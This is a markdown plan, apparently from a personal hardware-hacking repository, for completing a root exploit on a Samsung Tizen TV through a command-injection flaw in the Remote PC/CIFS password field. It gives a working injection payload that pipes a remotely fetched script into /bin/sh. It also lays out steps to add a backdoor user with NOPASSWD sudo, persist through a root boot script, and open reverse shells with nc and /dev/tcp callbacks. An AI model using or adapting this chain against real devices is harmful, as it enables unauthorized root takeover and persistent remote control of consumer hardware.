# tiz0wn — completing the TV root exploit (plan)

## Goal
Finish the exploit work on the Samsung GQ55Q60TGUXZG / T-NKLDEUC-2743.0 so the
already-proven Remote PC/CIFS UID-0 sink delivers a **persistent root shell with
our own user account** on the TV.

## What is already proven (from the repo + recovery bundle)
- `mount.smb.sh` (SHA `37aaf2f…`) evaluates credential fields via root
  `/bin/bash -c` — live-proven `uid0-proof` on 2026-09-28 (one-shot marker).
- `remotepc_uilauncher` writes `username=`, `password=`, `smbpath=` raw; the
  password field is the proven injection channel (160-byte reviewed bound,
  `${IFS}` separators, `$( … )` wrapped, stdout empty).
- Boot consumers on persistent `/opt` (AT-HUB `parseinfo.sh`, Dlog_buffer.sh,
  joystick udev rule, setcap units) — static `execution-reachable`.
- `/opt` = `/home -> opt/usr/home` persistent data partition; root helpers live
  on ext4 `/` (writable, per fstab) — self-heal writes persist reboot.
- Self-heal installer already proven to run as root via `curl | /bin/sh -s $B`
  (used once to patch helpers; backups `<file>.pre-root-sink-fix`).

## Gap to close
Current repo only plants an inert 32-byte canary. Missing: root shell + our own
user + persistence across reboot.

## Implementation plan (host side — no TV yet)

### 1. Payload (single password trigger, ≤160 bytes)
Two triggering options, in order of preference:
- **Password fetch** (proven shape, ≤160 B):
  `$(/usr/bin/curl${IFS}-fsS${IFS}http://HOST:18080/d|/bin/sh)` (67 B proven)
- The served script then does everything (no size limit).

### 2. Delivered root script (served over HTTP, hash-pinned)
Actions, all idempotent, logged to `/tmp/tiz0wn-root-setup.log`:
1. Create our user (e.g. `tiz0wn`, wheel-less but UID 0 capable group) via
   `useradd`/`passwd` if absent; set password hash.
2. Append `tiz0wn ALL=(ALL) NOPASSWD:ALL` to `sudoers` if sudo exists.
3. Persistence — install BOTH:
   - `/opt/etc/parseinfo.sh` root-exec at every boot (AT-HUB.service, no
     `User=` → root) that re-checks our user exists and re-creates it if
     missing (self-healing backstop), plus keeps dropbear/telnet off.
   - Ensure `/etc/passwd`/`/etc/shadow` entries survive (they are on the ext4
     rootfs — write persists reboot).
4. Root shell on demand:
   - Enable `/etc/passwd` root shell stays `/bin/sh`; add our own SSH key to
     `/opt/usr/home/…/.ssh/authorized_keys` if sshd exists — firmware has NO
     sshd, so instead:
   - Start telnet/dropbear via existing inetd path if any; otherwise rely on
     boot-consumer script to spawn `/bin/sh -i </dev/tcp` backconnect using
     busybox if present — check `tar tf rootfs.tar | grep busybox`.
   - Fallback: the boot script calls back to the Mac (`nc HOST 4444 -e /bin/sh`
     or `/dev/tcp/HOST/4444`) every boot — a persistent root reverse shell.
5. Verify: run `id` as root → write `/opt/usr/home/owner/share/tmp/sdk_tools/tiz0wn-root-<token>` marker; read back via SDB push classifier (two-push, proven pattern).

### 3. Verification (host)
- `tar -tf private/fw-analysis/work/rootfs.tar` for `busybox`, `telnetd`,
  `dropbear`, `sshd`, `/usr/bin/nc` availability before writing step 4.
- Serve script via existing `serve.py`/`serve_http.py` patterns.
- Offline repro: extend `password_payload.py` grammar only privately — no new
  tracked test needed.

### 4. Live run (one trigger)
- Start HTTP server; trigger via the proven password paste (Shared Folder flow).
- Verify user + boot script + reverse shell; record evidence in `evidence/`.

### 5. Persistence check (reboot)
- Reboot TV once, confirm shell/user re-established by the AT-HUB boot consumer.

## Files to add
- `private/persist-root/serve.py` (reuse selfheal serve.py, serve new script)
- `private/persist-root/root-setup.sh` (delivered script)
- `private/persist-root/payload.py` (password builder, reuse pattern)
- `private/persist-root/README.md` (procedure + rollback)
Rollback: delete user, restore `/opt/etc/parseinfo.sh` from backup, remove
boot hook.
